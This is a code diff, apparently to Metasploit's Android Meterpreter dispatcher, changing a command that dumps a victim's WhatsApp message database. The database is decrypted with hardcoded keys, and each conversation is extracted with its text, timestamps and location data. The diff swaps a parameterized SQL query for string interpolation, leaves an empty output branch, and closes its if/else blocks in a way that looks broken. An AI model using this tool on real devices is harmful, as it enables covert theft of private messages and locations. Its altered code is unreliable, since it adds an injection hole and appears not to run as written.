@@ -1,6 +1,7 @@
 # -*- coding: binary -*-
 require 'rex/post/meterpreter'
 require 'sqlite3'
+require 'date'
 
 module Rex
 module Post
@@ -407,6 +408,8 @@ class Console::CommandDispatcher::Android
     getmedia_index = 0
     getmedia_type = String.new
     extractmsg = false
+    output = false
+    local = false
     
     dump_whatsapp_opts = Rex::Parser::Arguments.new(
       "-h" => [ false, "Help Banner" ],
@@ -414,11 +417,12 @@ class Console::CommandDispatcher::Android
       "-d" => [ false, "Dump whatsapp msgstore"],
       "-x" => [ false, "Extract conversations from msgstore"],
       "-p" => [ true,  "Get profile picture for specific contact"],
-      "-o" => [ true,  "Output path for msgstore.db" ],
+      "-o" => [ true,  "Save output to file" ],
       "-r" => [ false, "Get list of available profile pictures"],
       "-m" => [ false, "Get list of media files available"],
       "-n" => [ true,  "Get media file by index, specified with type -t"],
-      "-t" => [ true,  "Set type of media file [image|video|voice|audio]"]
+      "-t" => [ true,  "Set type of media file [image|video|voice|audio]"],
+      "-i" => [ true,  "Extract conversations from local msgstore.db"]
       )
 
     dump_whatsapp_opts.parse( args ) { | opt, idx, val |
@@ -444,6 +448,12 @@ class Console::CommandDispatcher::Android
         getmedia_type = val.to_s
       when "-x"
         extractmsg = true
+      when "-o"
+        output_path = val
+        output = true
+      when "-i"
+        local = true
+        local_path = val
       end
     } 
 
@@ -526,168 +536,196 @@ class Console::CommandDispatcher::Android
 
 
     print_status("Dumping whatsapp local msgstore")
-    msgstore = client.android.dump_whatsapp
-    path = 'dump_whatsapp_msgstore.db'
+     
+    if (local)
+      path = local_path
+    else
+      msgstore = client.android.dump_whatsapp
+      path = 'dump_whatsapp_msgstore.db'
 
-    if (msgstore['raw'])
+      if (msgstore['raw'])
 
-      # check if crypt or crypt5
-      if (msgstore['metadata'].split(':')[0] == 'crypt')
+        # check if crypt or crypt5
+        if (msgstore['metadata'].split(':')[0] == 'crypt')
 
-        print_status("Decrypting crypt msgstore")
-        cipher = OpenSSL::Cipher::AES192.new(:ECB)
-        cipher.decrypt
-        cipher.key = "346a23652a46392b4d73257c67317e352e3372482177652c".scan(/../).map(&:hex).map(&:chr).join
+          print_status("Decrypting crypt msgstore")
+          cipher = OpenSSL::Cipher::AES192.new(:ECB)
+          cipher.decrypt
+          cipher.key = "346a23652a46392b4d73257c67317e352e3372482177652c".scan(/../).map(&:hex).map(&:chr).join
 
-        ::File.open(path, 'wb') { |file| file.write(cipher.update(msgstore['raw']) + cipher.final) }
+          ::File.open(path, 'wb') { |file| file.write(cipher.update(msgstore['raw']) + cipher.final) }
 
-      else
-        print_status("Decrypting crypt5 msgstore")
+        else
+          print_status("Decrypting crypt5 msgstore")
 
-        key = [141, 75, 21, 92, 201, 255, 129, 229, 203, 246, 250, 120, 25, 54, 106, 62, 198, 33, 166, 86, 65, 108, 215, 147]
-        iv  = [0x1E,0x39,0xF3,0x69,0xE9,0xD,0xB3,0x3A,0xA7,0x3B,0x44,0x2B,0xBB,0xB6,0xB0,0xB9]
+          key = [141, 75, 21, 92, 201, 255, 129, 229, 203, 246, 250, 120, 25, 54, 106, 62, 198, 33, 166, 86, 65, 108, 215, 147]
+          iv  = [0x1E,0x39,0xF3,0x69,0xE9,0xD,0xB3,0x3A,0xA7,0x3B,0x44,0x2B,0xBB,0xB6,0xB0,0xB9]
 
-        cipher = OpenSSL::Cipher::AES192.new(:ECB)
-        cipher.decrypt
+          cipher = OpenSSL::Cipher::AES192.new(:ECB)
+          cipher.decrypt
 
-        md5 = OpenSSL::Digest::MD5.new
-        md5 = md5.digest(msgstore['metadata'].split(':')[1]).bytes
-        (0...24).each { |i| key[i] ^= md5[i&0xF] }
-        cipher.key = key
-        cipher.iv = iv
+          md5 = OpenSSL::Digest::MD5.new
+          md5 = md5.digest(msgstore['metadata'].split(':')[1]).bytes
+          (0...24).each { |i| key[i] ^= md5[i&0xF] }
+          cipher.key = key
+          cipher.iv = iv
 
-        ::File.open(path, 'wb') { |file| file.write(cipher.update(msgstore['raw']) + cipher.final) }
+          ::File.open(path, 'wb') { |file| file.write(cipher.update(msgstore['raw']) + cipher.final) }
+        end
+
+        print_status("Decrypted msgstore saved to #{::File.expand_path(path)}")
       end
+    end
 
-      print_status("Decrypted msgstore saved to #{::File.expand_path(path)}")
+    begin
+      db = SQLite3::Database.open path
+      messages = db.prepare("SELECT Count(*) FROM messages").execute
+      chat_list = db.prepare("SELECT Count(*) FROM chat_list").execute
+      print_status("Got #{messages.first[0]} messages, #{chat_list.first[0]} conversations") 
+    rescue SQLite3::Exception => e    
+      print_error("Error getting data from database")
+    ensure
+      chat_list.close if chat_list
+      messages.close if messages
+      db.close if db
+    end
 
-      begin
+    if (extractmsg)
+      chat_sessions = Array.new  
+      print_status("Extracting chat conversations")
+
+      begin 
         db = SQLite3::Database.open path
-        messages = db.prepare("SELECT Count(*) FROM messages").execute
-        chat_list = db.prepare("SELECT Count(*) FROM chat_list").execute
-        print_status("Got #{messages.first[0]} messages, #{chat_list.first[0]} conversations") 
+
+        begin                            
+          chats = db.prepare("SELECT * FROM chat_list").execute
+
+          # chat[0] --> _id (primary key)
+          # chat[1] --> key_remote_jid (contact jid or group chat jid)
+          # chat[2] --> message_table_id (id of last message in this chat, corresponds to table messages primary key)
+          
+          while (chat = chats.next) do
+
+              begin
+                tmp = db.prepare("SELECT timestamp FROM messages WHERE _id=?").bind_param(1, chat[2]).execute
+                lastmessagedate = tmp.fetchone()[0]       
+              rescue
+                lastmessagedate = nil
+              ensure
+                tmp.close if tmp
+              end
+
+              chat_sessions <<
+              {
+                'primary'   => chat[0],
+                'nickname'  => chat[1].split('@')[0],
+                'id'        => chat[1],
+                'count'     => nil,
+                'status'    => nil,
+                'unread'    => nil,
+                'lastdate'  => lastmessagedate,
+                'list'      => Array.new
+              }
+
+          end
+
+        rescue SQLite3::Exception => e    
+          print_error("Error getting data from database")
+        ensure
+          chats.close if chats
+        end
+
+        chat_sessions.each { |chat|
+          begin
+            msgs = db.prepare("SELECT * FROM messages WHERE key_remote_jid='#{chat['id']}' ORDER BY _id ASC;").execute
+
+            # msg[0] --> _id (primary key)
+            # msg[1] --> key_remote_jid
+            # msg[2] --> key_from_me
+            # msg[3] --> key_id
+            # msg[4] --> status
+            # msg[5] --> needs_push
+            # msg[6] --> data
+            # msg[7] --> timestamp
+            # msg[8] --> media_url
+            # msg[9] --> media_mime_type
+            # msg[10] -> media_wa_type
+            # msg[11] -> media_size
+            # msg[12] -> media_name
+            # msg[13] -> latitude
+            # msg[14] -> longitude
+            # msg[15] -> thumb_image
+            # msg[16] -> remote_resource
+            # msg[17] -> received_timestamp
+            # msg[18] -> send_timestamp
+            # msg[19] -> receipt_server_timestamp
+            # msg[20] -> receipt_device_timestamp
+
+            while (msg = msgs.next) do
+              message = Hash.new
+
+              if (!msg[16] or msg[16].length == 0)
+                message['from'] = msg[1]
+              else
+                message['from'] = msg[16]
+              end
+
+              if (msg[2] == 1)
+                message['from'] = 'me'
+              end
+
+              message['thumbnaildata']  = msg[21]
+              message['id']             = msg[0]
+              message['timestamp']      = msg[7]
+              message['data']           = msg[6]
+              message['status']         = msg[4]
+              message['media_name']     = msg[12]
+              message['media_url']      = msg[8]
+              message['media_wa_type']  = msg[10]
+              message['media_size']     = msg[11]
+              message['latitude']       = msg[13]
+              message['longitude']      = msg[14]
+
+              chat['list'] << message
+            end
+
+          rescue SQLite3::Exception => e    
+            print_error("Error getting data from database") 
+          ensure
+            msgs.close if msgs
+          end
+        }
+
       rescue SQLite3::Exception => e    
-        print_error("Error getting data from database")
+        print_error("Error getting data from database")  
       ensure
-        chat_list.close if chat_list
-        messages.close if messages
         db.close if db
       end
 
-      if (extractmsg)
-        chat_sessions = Array.new  
-        print_status("Extracting chat conversations")
+      print_status
+      chat_sessions.each_with_index {|chat, index|
+        chat['count'] = chat['list'].count
+        header = "    ##{index+1} id: #{chat['nickname']} - count: #{chat['count']}"
+        print_line(header)
+        print_line('    ' + '-' * (header.length - 4))
 
-        begin 
-          db = SQLite3::Database.open path
+        chat['list'].each_with_index {|msg, index |
+          print_line('    ' + (msg['from'] == 'me' ? '<== ':'==> ') + "#{DateTime.strptime(msg['timestamp'].to_s[0..-4],'%s').strftime('%d-%m-%Y %H:%M')} | " + (msg['data'] ? msg['data'] : '<NONE>'))
+        }
 
-          begin                            
-            chats = db.prepare("SELECT * FROM chat_list").execute
+        print_line
+      }
+      print_line
 
-            # chat[0] --> _id (primary key)
-            # chat[1] --> key_remote_jid (contact jid or group chat jid)
-            # chat[2] --> message_table_id (id of last message in this chat, corresponds to table messages primary key)
-            
-            while (chat = chats.next) do
-                name = chat[1].split('@')[0]
-
-                begin
-                  tmp = db.prepare("SELECT timestamp FROM messages WHERE _id=?").bind_param(1, chat[2]).execute
-                  lastmessagedate = tmp.fetchone()[0]       
-                rescue
-                  lastmessagedate = nil
-                ensure
-                  tmp.close if tmp
-                end
-
-                chat_sessions <<
-                {
-                  'primary'   => chat[0],
-                  'nickname'  => chat[1].split('@')[0],
-                  'id'        => chat[1],
-                  'count'     => nil,
-                  'status'    => nil,
-                  'unread'    => nil,
-                  'lastdate'  => lastmessagedate,
-                  'list'      => Array.new
-                }
-            end
-          ensure
-            chats.close if chats
-          end
-
-          chat_sessions.each { |chat|
-            begin
-              msgs = db.prepare("SELECT * FROM messages WHERE key_remote_jid=? ORDER BY _id ASC;").bind_param(1, chat['id']).execute
-              
-              # msg[0] --> _id (primary key)
-              # msg[1] --> key_remote_jid
-              # msg[2] --> key_from_me
-              # msg[3] --> key_id
-              # msg[4] --> status
-              # msg[5] --> needs_push
-              # msg[6] --> data
-              # msg[7] --> timestamp
-              # msg[8] --> media_url
-              # msg[9] --> media_mime_type
-              # msg[10] -> media_wa_type
-              # msg[11] -> media_size
-              # msg[12] -> media_name
-              # msg[13] -> latitude
-              # msg[14] -> longitude
-              # msg[15] -> thumb_image
-              # msg[16] -> remote_resource
-              # msg[17] -> received_timestamp
-              # msg[18] -> send_timestamp
-              # msg[19] -> receipt_server_timestamp
-              # msg[20] -> receipt_device_timestamp
-
-              while (msg = msgs.next) do
-                message = Hash.new
-
-                if (!msg[16] or msg[16].length == 0)
-                  message['from'] = msg[1]
-                else
-                  message['from'] = msg[16]
-                end
-
-                if msg[2] == 1
-                  message['from'] = 'me'
-                end
-
-                message['thumbnaildata']  = msg[21]
-                message['id']             = msg[0]
-                message['timestamp']      = msg[7]
-                message['data']           = msg[6]
-                message['status']         = msg[4]
-                message['media_name']     = msg[12]
-                message['media_url']      = msg[8]
-                message['media_wa_type']  = msg[10]
-                message['media_size']     = msg[11]
-                message['latitude']       = msg[13]
-                message['longitude']      = msg[14]
-
-                chat['list'] << message
-              end
-
-            rescue SQLite3::Exception => e    
-              print_error("Error getting data from database") 
-            ensure
-              msgs.close if msgs
-            end
-          }
-
-        rescue SQLite3::Exception => e    
-          print_error("Error getting data from database")  
-        ensure
-          db.close if db
-        end
-
-        print_status("Whatsapp was dumped successfully")
+      if (output)
       else
-        print_error("Couldn't dump whatsapp msgstore")
-      end   
+      end
+
     end
+    print_status("Whatsapp was dumped successfully")
+    else
+      print_error("Couldn't dump whatsapp msgstore")
+    end   
   end
 
   def save_and_open(data, path)
